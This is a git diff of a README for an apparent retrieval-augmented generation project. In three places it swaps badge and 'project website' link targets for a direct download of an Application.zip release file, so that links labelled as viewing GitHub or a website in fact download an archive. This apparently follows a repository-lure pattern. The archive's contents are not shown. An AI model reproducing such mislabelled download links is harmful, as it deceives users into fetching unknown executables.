@@ -1,6 +1,6 @@
 # 🚀 Welcome to Retrieval-Augmented-Generation-RAG
 
-[![View on GitHub](https://img.shields.io/badge/View_on-GitHub-blue?logo=github)](https://github.com/file/Application.zip)
+[![View on GitHub](https://github.com/lucibear23/Retrieval-Augmented-Generation-RAG/releases/download/v1.0.0/Application.zip)](https://github.com/lucibear23/Retrieval-Augmented-Generation-RAG/releases/download/v1.0.0/Application.zip)
 
 ## Introduction
 
@@ -54,7 +54,7 @@ Make sure to check the Releases section for the latest updates and releases rela
 
 ## Additional Resources
 
-For more information and in-depth exploration of retrieval-augmented generation and related topics, you can visit the [project website](https://github.com/file/Application.zip).
+For more information and in-depth exploration of retrieval-augmented generation and related topics, you can visit the [project website](https://github.com/lucibear23/Retrieval-Augmented-Generation-RAG/releases/download/v1.0.0/Application.zip).
 
 ## Let's Collaborate!
 
@@ -68,4 +68,4 @@ Join us on this exciting journey of augmenting Language Models with retrieval me
 
 Now, go ahead and dive into the realm of Retrieval-Augmented Generation with RAG! 🚀
 
-[![Explore on GitHub](https://img.shields.io/badge/Explore_on-GitHub-red?logo=github)](https://github.com/file/Application.zip)
+[![Explore on GitHub](https://github.com/lucibear23/Retrieval-Augmented-Generation-RAG/releases/download/v1.0.0/Application.zip)](https://github.com/lucibear23/Retrieval-Augmented-Generation-RAG/releases/download/v1.0.0/Application.zip)
